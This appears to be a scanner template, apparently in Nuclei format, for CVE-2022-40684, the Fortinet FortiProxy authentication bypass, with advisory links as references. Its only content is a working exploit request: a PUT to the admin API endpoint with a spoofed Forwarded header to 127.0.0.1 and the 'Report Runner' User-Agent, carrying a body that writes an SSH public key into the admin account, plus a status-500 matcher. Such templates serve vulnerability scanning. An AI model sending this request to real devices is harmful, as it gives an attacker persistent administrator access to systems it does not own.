id: yaml-poc-fortinet-fortiproxy-unauthorized_access-CVE-2022-40684
info:
  name: Yaml Poc Fortinet Fortiproxy Unauthorized_Access Cve 2022 40684
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-fortinet-fortiproxy-unauthorized_access-CVE-2022-40684'
  tags: fortinet,unauth,cve
  classification:
    cve-id: CVE-2022-40684
  reference:
  - http://packetstormsecurity.com/files/169431/Fortinet-FortiOS-FortiProxy-FortiSwitchManager-Authentication-Bypass.html
  - http://packetstormsecurity.com/files/171515/Fortinet-7.2.1-Authentication-Bypass.html
  - https://cxsecurity.com/cveshow/CVE-2022-40684/
  - https://fortiguard.com/psirt/FG-IR-22-377
  - https://packetstormsecurity.com/files/169431/Fortinet-FortiOS-FortiProxy-FortiSwitchManager-Authentication-Bypass.html
http:
- method: PUT
  path:
  - /api/v2/cmdb/system/admin/admin
  body: '{"ssh-public-key1": "{{key}}"}

    '
  headers:
    Content-Type: application/json
    Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"
    User-Agent: Report Runner
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
